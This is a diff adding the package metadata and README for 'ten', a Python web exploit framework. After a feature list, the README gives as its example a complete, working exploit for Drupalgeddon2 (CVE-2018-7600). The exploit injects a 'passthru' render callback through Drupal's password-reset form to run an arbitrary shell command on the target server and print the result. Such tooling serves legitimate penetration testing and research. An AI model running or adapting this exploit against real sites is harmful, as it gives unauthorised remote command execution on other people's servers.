@@ -1,0 +1,115 @@
+Metadata-Version: 2.1
+Name: ten
+Version: 0.1.8
+Summary: A (small) web exploit framework
+Author: Charles "cfreal" Fol
+Author-email: folcharles@gmail.com
+Requires-Python: >=3.10,<4.0
+Classifier: Programming Language :: Python :: 3
+Classifier: Programming Language :: Python :: 3.10
+Classifier: Programming Language :: Python :: 3.11
+Requires-Dist: beautifulsoup4 (>=4.12.2,<5.0.0)
+Requires-Dist: colorama (>=0.4.6,<0.5.0)
+Requires-Dist: lxml (>=4.9.2)
+Requires-Dist: pyyaml (>=6.0,<7.0)
+Requires-Dist: requests (>=2.28.2,<3.0.0)
+Requires-Dist: requests-toolbelt (>=0.1.10) ; python_version >= "3"
+Requires-Dist: requests-toolbelt (>=1) ; python_version >= "3.11"
+Requires-Dist: rich (>=13.3.4,<14.0.0)
+Description-Content-Type: text/markdown
+
+![Coverage](docs/coverage.svg)
+
+# ten
+
+My (small) web exploit framework. I got tired of writing standard code over and over again,
+so I made this. Makes code more concise, clearer, faster to write. Might be useful to you.
+
+It helps with HTTP interactions, handling user input, providing clear output, handling files, and running shell commands.
+
+Useful to build POCs, and convert them into full, documented exploits in a blink.
+
+# Documentation
+
+Documentation is available here: [https://cfreal.github.io/ten/](https://cfreal.github.io/ten/).
+
+It includes tutorials, quickstart guides, and the Python documentation.
+
+# Installation
+
+Ten is available on [PyPi](https://pypi.org/project/ten/).
+
+```bash
+$ pip install ten
+```
+
+# Features
+
+* Input/output
+    * Arguments to the main function are automatically mapped to `argparse`
+        * They can hold a default value, get documented, etc.
+    * Output is clear and readable
+* HTTP
+    * Improves the standard `requests` API
+    * Parse HTTP responses easily (regex, CSS selectors, forms)
+    * Turn BURP on and off in a blink
+    * Concurrency
+    * Lots more.
+* Data conversion
+    * Transform data: base64, hashing, query string, CSV, JSON, ...
+    * Available as a tool: `tf`
+* ...
+
+# Example
+
+Functional, fully documented Drupalgeddon2 exploit:
+
+```python
+#!/usr/bin/env python3
+
+from ten import *
+
+
+@entry
+@arg("url", "URL of the Drupal website to exploit")
+@arg("command", "Command to run on the server. Defaults to `id`")
+def main(url, command="id"):
+    """Exploit for Drupalgeddon2 (CVE-2018-7600)."""
+
+    session = ScopedSession(url)
+    response = session.post(
+        url,
+        params={
+            "q": "user/password",
+            "name[#post_render][]": "passthru",
+            "name[#markup]": command,
+            "name[#type]": "markup",
+        },
+        data={"form_id": "user_pass", "_triggering_element_name": "name"},
+    )
+    try:
+        form = response.form(id="user_pass")
+    except FormNotFoundError:
+        failure("Unable to find form in response")
+    
+    build_id = form["form_build_id"]
+    response = session.post(
+        url,
+        params={
+            "q": f"file/ajax/name/#value/{build_id}"
+        },
+        data={"form_build_id": build_id},
+    )
+    result = response.re.search(r"^(.*)\[{", flags=re.S)
+    
+    assume(result, "Unable to find command result in response")
+
+    msg_success("Exploit done")
+    msg_info("Command result:")
+
+    msg_print(result.group(1))
+
+
+main()
+```
+
